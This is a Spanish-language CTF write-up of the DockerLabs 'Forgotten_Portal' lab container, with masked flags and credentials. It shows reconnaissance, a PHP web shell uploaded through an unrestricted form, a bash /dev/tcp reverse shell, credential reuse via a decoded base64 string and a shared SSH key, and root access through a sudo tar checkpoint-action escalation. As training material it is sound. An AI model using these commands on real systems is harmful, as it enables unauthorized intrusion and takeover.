---
title: DockerLabs - Forgotten_Portal
summary: "Write-up del laboratorio Forgotten_Portal de DockerLabs"
author: elcybercurioso
date: 2026-02-03 12:53:36
categories: [Post, DockerLabs]
tags: []
media_subpath: "/assets/img/posts/dockerlabs_forgotten_portal"
image:
  path: main.webp
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Forgotten_Portal]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Forgotten_Portal]
└─$ nmap -sCV -p22,80 172.17.0.2                  
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1d:4a:16:27:ad:b8:0b:aa:28:64:b0:10:3b:be:79:1c (ECDSA)
|_  256 0b:0f:11:d6:5a:e9:f5:25:c8:17:0d:71:c1:29:c9:53 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: CyberLand Labs - Innovaci\xC3\xB3n en Ciberseguridad
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## análisis

Comenzamos revisando la página web alojada en el puerto 80 de la máquina:

![Desktop View](/20260122005806.webp){: width="750" height="490" .shadow}

Mientras analizamos la página web, dejaremos **gobuster** corriendo en segundo plano buscando por fuerza bruta recursos en el servidor:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Forgotten_Portal]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt            
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/team.html            (Status: 200) [Size: 1327]
/index.html           (Status: 200) [Size: 3010]
/blog.html            (Status: 200) [Size: 931]
/contact.html         (Status: 200) [Size: 826]
/server-status        (Status: 403) [Size: 275]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

Encontramos el siguiente mensaje oculto en el código fuente de la página, donde hacen referencia a una cierta funcionalidad:

![Desktop View](/20260122010014.webp){: width="972" height="589" .shadow}

## acceso inicial (www-data)

Vemos que accedemos a una página que cuenta con una funcionalidad de subida de archivos:

![Desktop View](/20260122010103.webp){: width="972" height="589" .shadow}

Como nos indican que permiten la subida de script en PHP, procedemos a subir el siguiente script, el cual nos permite ejecutar comandos de forma remota:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Forgotten_Portal]
└─$ cat cmd.php                                                
<?php system($_GET['cmd']); ?>
```

Y vemos que efectivamente permiten la subida sin problema de scripts en PHP:

![Desktop View](/20260122010317.webp){: width="972" height="589" .shadow}

Uno de los recursos que nos devolvió **gobuster** es `/uploads`, el cual si ahora accedemos, veremos el script que acabamos de subir:

![Desktop View](/20260122010448.webp){: width="600" height="420" .shadow}

Accedemos al script, y vemos que podemos ejecutar comandos de forma remota (**RCE**):

```bash
http://172.17.0.2/uploads/cmd.php?cmd=id
```

![Desktop View](/20260122010628.webp){: width="972" height="589" .shadow}

Una vez obtenida la ejecución de comandos de forma remota, ahora procederemos a entablar una consola, comenzando por ponernos en escucha con **nc**, en mi caso por el puerto 4444 y ejecutando el siguiente comando (los `%` están codificados a `%26` para evitar conflictos):

```bash
http://172.17.0.2/uploads/cmd.php?cmd=bash -c 'bash -i >%26 /dev/tcp/172.17.0.1/4444 0>%261'
```

De esta manera, habremos conseguido una consola de forma remota:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Forgotten_Portal]
└─$ nc -lvp 4444                
listening on [any] 4444 ...
172.17.0.2: inverse host lookup failed: Unknown host
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 36330
www-data@b1116201dbcf:/var/www/html/uploads$ whoami
whoami
www-data
www-data@b1116201dbcf:/var/www/html/uploads$ hostname -I
hostname -I
172.17.0.2
```

Trataremos la TTY para poder operar con mayor facilidad:

```bash
www-data@b1116201dbcf:/var/www/html/uploads$ script -c bash /dev/null
script -c bash /dev/null
Script started, output log file is '/dev/null'.
www-data@b1116201dbcf:/var/www/html/uploads$ ^Z
zsh: suspended  nc -lvp 4444

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Forgotten_Portal]
└─$ stty raw -echo;fg   
[1]  + continued  nc -lvp 4444
                              reset xterm

www-data@b1116201dbcf:/var/www/html/uploads$ export TERM=xterm
www-data@b1116201dbcf:/var/www/html/uploads$ export SHELL=bash
www-data@b1116201dbcf:/var/www/html/uploads$ stty rows 45 columns 210
```

## movimiento lateral (alice)

Listaremos los usuarios del sistema que tengan asignada una consola en el fichero `/etc/passwd`:

```bash
www-data@b1116201dbcf:/$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
cyberland:x:1001:1001::/home/cyberland:/bin/sh
alice:x:1002:1002::/home/alice:/bin/bash
bob:x:1003:1003::/home/bob:/bin/bash
charlie:x:1004:1004::/home/charlie:/bin/bash
```

En el directorio `/var/www/html/` encontramos el fichero `access_log`, el cual contiene una cadena codificada (en Base64 seguramente):

```bash
www-data@b1116201dbcf:/$ ls -la /var/www/html/
total 1772
drwxr-xr-x 1 www-data www-data    4096 Nov 25  2024 .
drwxr-xr-x 1 root     root        4096 Nov 25  2024 ..
-rw-r----- 1 www-data www-data     994 Nov 25  2024 access_log
-rw-r--r-- 1 root     root     1550064 Nov 25  2024 banner.png
-rw-r--r-- 1 root     root         931 Nov 25  2024 blog.html
-rw-r--r-- 1 root     root         826 Nov 25  2024 contact.html
-rw-r--r-- 1 root     root        3010 Nov 25  2024 index.html
-rw-r--r-- 1 root     root      204246 Nov 25  2024 logo.png
-rw-r--r-- 1 root     root        1701 Nov 25  2024 m4ch1n3_upload.html
-rw-r--r-- 1 root     root        3005 Nov 25  2024 m4ch1n3_upload.php
-rw-r--r-- 1 root     root        1749 Nov 25  2024 script.js
-rw-r--r-- 1 root     root        2870 Nov 25  2024 styles.css
-rw-r--r-- 1 root     root        1327 Nov 25  2024 team.html
drwxr-xr-x 1 www-data www-data    4096 XXX XX XX:XX uploads
www-data@b1116201dbcf:/$ cd  /var/www/html/
www-data@b1116201dbcf:/var/www/html$ cat access_log 
# --- Access Log ---
# Fecha: 2023-11-22
# Descripción: Registro de actividad inusual detectada en el sistema.
# Este archivo contiene eventos recientes capturados por el servidor web.

[2023-11-21 18:42:01] INFO: Usuario 'www-data' accedió a /var/www/html/.
[2023-11-21 18:43:45] WARNING: Intento de acceso no autorizado detectado en /var/www/html/admin/.
[2023-11-21 19:01:12] INFO: Script 'backup.sh' ejecutado por el sistema.
[2023-11-21 19:15:34] ERROR: No se pudo cargar el archivo config.php. Verifique las configuraciones.

# --- Logs del sistema ---
[2023-11-21 19:20:00] INFO: Sincronización completada con el servidor principal.
[2023-11-21 19:35:10] INFO: Archivo temporal creado: /tmp/tmp1234.
[2023-11-21 19:36:22] INFO: Clave codificada generada: ********************************
[2023-11-21 19:50:00] INFO: Actividad normal en el servidor. No se detectaron anomalías.
[2023-11-22 06:12:45] WARNING: Acceso sospechoso detectado desde IP 192.168.1.100.

# --- Fin del Log ---
```

Si la decodificamos, veremos las credenciales de la usuaria `alice`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Forgotten_Portal]
└─$ echo -ne "********************************" | base64 -d
alice:******************
```

Tratamos de conectarnos como la usuaria `alice`, y vemos que las credenciales son correctas:

```bash
www-data@b1116201dbcf:/var/www/html$ su alice 
Password: 
alice@b1116201dbcf:/var/www/html$ whoami
alice
```

## movimiento lateral (bob)

En su directorio personal encontramos la primera flag:

```bash
alice@b1116201dbcf:~$ cat user.txt 
CYBERLAND{****_*****_****}
```

Procedemos a revisar el directorio personal de la usuaria `alice`, donde vemos que el historial de Bash se puede consultar, y vemos que se ejecutan algunos comandos relacionados con keys de SSH y el directorio `incidents` que está dentro de su mismo directorio personal:

```bash
alice@b1116201dbcf:~$ cat .bash_history 
mkdir .ssh
exit
ll
cd .ssh/
ll
cat sshkey 
mv sshkey id_rsa
ll
cat id_rsa
exit
ll
incidents
mkdir incidents
cd incidents/
nano report
exit
cd incidents/
cat report 
exit
cd ..
cd root
cd home/
ll
cd alice/
ll
exit
cd ..
cd home/alice/
nano user.txt
exit
```

Si revisamos la carpeta `incidents`, vemos que hay una nota en la que mencionan que por un fallo de configuración en el servidor principal, se replicó la misma clave privada en todos los directorios de los usuarios. También se menciona cual es la passphrase del usuario `bob`:

```bash
alice@b1116201dbcf:~$ ls -la incidents/
total 12
drwxrwxr-x 2 alice alice 4096 Nov 25  2024 .
drwxr-x--- 1 alice alice 4096 Nov 25  2024 ..
-rw-rw-r-- 1 alice alice 2071 Nov 25  2024 report
alice@b1116201dbcf:~$ cat incidents/report 
=== INCIDENT REPORT ===
Archivo generado automaticamente por el sistema de auditoria interna de CyberLand Labs.

Fecha: 2023-11-22  
Auditor Responsable: Alice Carter  
Asunto: Configuracion Erronea de Claves SSH  

=== DESCRIPCION ===  
Durante una reciente auditoria de seguridad en nuestro servidor principal, descubrimos un grave error de configuracion en el sistema de autenticacion SSH. El problema parece originarse en un script automatizado utilizado para generar claves RSA para los usuarios del sistema.

En lugar de crear claves unicas para cada usuario, el script genero una unica clave `id_rsa` y la replico en todos los directorios de usuario en el servidor. Ademas, la clave esta protegida por una passphrase que, aunque tecnicamente existe, no ofrece ningun nivel real de seguridad.

=== HALLAZGO ADICIONAL ===  
Durante el analisis, encontramos que la passphrase de la clave privada del usuario `bob` se almaceno accidentalmente en un archivo temporal en el sistema. El archivo no ha sido eliminado, lo que significa que la passphrase esta ahora expuesta.

**Passphrase del Usuario `bob`:** `**************`

=== DETALLES DE LA CONFIGURACION ===  
Clave Privada: id_rsa  
Passphrase: **************  
Ubicacion: Copiada en todos los directorios `/home/<usuario>/.ssh/`

=== CONSECUENCIAS ===  
1. **Perdida de Privacidad**: Todos los usuarios comparten la misma clave, lo que significa que cualquiera puede autenticarse como cualquier otro usuario si obtiene acceso a la clave.  

=== POSIBLES SOLUCIONES ===  
- Implementar un sistema centralizado de gestion de claves.  
- Forzar a los usuarios a cambiar sus claves regularmente.  
- Actualizar las politicas internas para prohibir el uso de scripts inseguros en la configuracion de credenciales.  

=== NOTA FINAL ===  
Este incidente pone de manifiesto la importancia de revisar las configuraciones criticas en sistemas sensibles. Es crucial que todo el equipo de IT se mantenga alerta y que se implementen controles mas estrictos para evitar errores similares en el futuro.

--- FIN DEL INFORME ---
```

Teniendo esto en cuenta, comprobamos si en la carpeta `.ssh` de la carpeta principal de la usuaria `alice` está la clave privada, y vemos que así es:

```bash
alice@b1116201dbcf:~$ cd .ssh/
alice@b1116201dbcf:~/.ssh$ ls
id_rsa
```

Sin embargo, vemos que los permisos que tiene nos son correctos, ya que para poder usarlos, solo el propietario debe tener permisos de lectura y escritura sobre el mismo:

```bash
alice@b1116201dbcf:~/.ssh$ ls -la id_rsa
-rw-r--r-- 1 alice alice  444 Nov 25  2024 id_rsa
```

Por ello, modificamos sus permisos antes de seguir:

```bash
alice@b1116201dbcf:~/.ssh$ chmod 600 id_rsa 
```

Lo siguiente es ver si podemos conectarnos como el usuario `bob` indicando la clave que nos indicaban, y logramos obtener con éxito una consola como el mismo:

```bash
alice@b1116201dbcf:~/.ssh$ ssh -i id_rsa bob@127.0.0.1
Enter passphrase for key 'id_rsa': 
bob@b1116201dbcf:~$ whoami
bob
```

## escalada de privilegios (root)

Al revisar los permisos SUDO del usuario `bob`, vemos que puede ejecutar `/bin/tar` como el usuario `root` sin aportar contraseña:

```bash
bob@b1116201dbcf:~$ sudo -l
Matching Defaults entries for bob on b1116201dbcf:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bob may run the following commands on b1116201dbcf:
    (ALL) NOPASSWD: /bin/tar
```

Consultaremos [GTFOBins](https://gtfobins.org/gtfobins/tar/#shell) para ver si encontramos como poder aprovecharnos de estos permisos, y así poder invocar una consola como el usuario `root`:

![Desktop View](/20260122013631.webp){: width="972" height="589" .shadow}

Emplearemos la opción `a`, pero modificando la consola que queremos obtener, que en este caso será una `/bin/bash`:

```bash
bob@b1116201dbcf:~$ sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
tar: Removing leading `/` from member names
root@b1116201dbcf:/home/bob# whoami
root
```

La segunda flag la encontramos en la carpeta del usuario `root`, y es la siguiente:

```bash
root@b1116201dbcf:/home/bob# cat /root/root.txt 
CYBERLAND{****_******_*******}
```

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>